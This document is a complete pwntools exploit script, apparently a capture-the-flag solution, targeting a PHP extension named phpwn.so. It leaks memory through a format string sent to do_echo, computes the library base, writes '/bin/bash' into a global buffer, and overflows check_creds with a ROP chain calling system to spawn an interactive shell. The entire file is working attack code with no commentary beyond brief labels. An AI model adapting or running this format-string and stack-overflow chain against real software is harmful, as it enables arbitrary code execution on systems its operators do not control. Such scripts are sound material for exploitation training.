#!/usr/bin/python3
from pwn import *

context.clear(arch="amd64")

elf = ELF("phpwn.so")
p = process(["/usr/bin/php", "-d", "extension=phpwn.so", "-a"])
p.recvline()
p.recvline()

# leak library base
p.sendline(b"do_echo('%p %p %p %p %p %p %p');")
leak = int(p.recvline().strip().split()[-1], 16)
elf.address = leak - 5320
pop_rdi_ret = ROP(elf).find_gadget(["pop rdi", "ret"]).address
global_buff = elf.address + 16896

p.info(f"phpwn.so base @ {elf.address:#x}")
p.info(f"pop_rdi_ret   @ {pop_rdi_ret:#x}")
p.info(f"global_buff   @ {global_buff:#x}")
p.info(f"system@plt    @ {elf.plt.system:#x}")

# write command to global buffer
p.sendline(b"do_echo('x/bin/bash');")
p.recvline()

# rop
_id = b"A" * 312 + p64(pop_rdi_ret)
_user = p64(global_buff + 1)
_pass = p64(elf.plt.system)

p.sendline(
    f'check_creds("{_id.__repr__()[2:-1]}", "{_user.__repr__()[2:-1]}", "{_pass.__repr__()[2:-1]}");'.encode()
)
p.interactive()
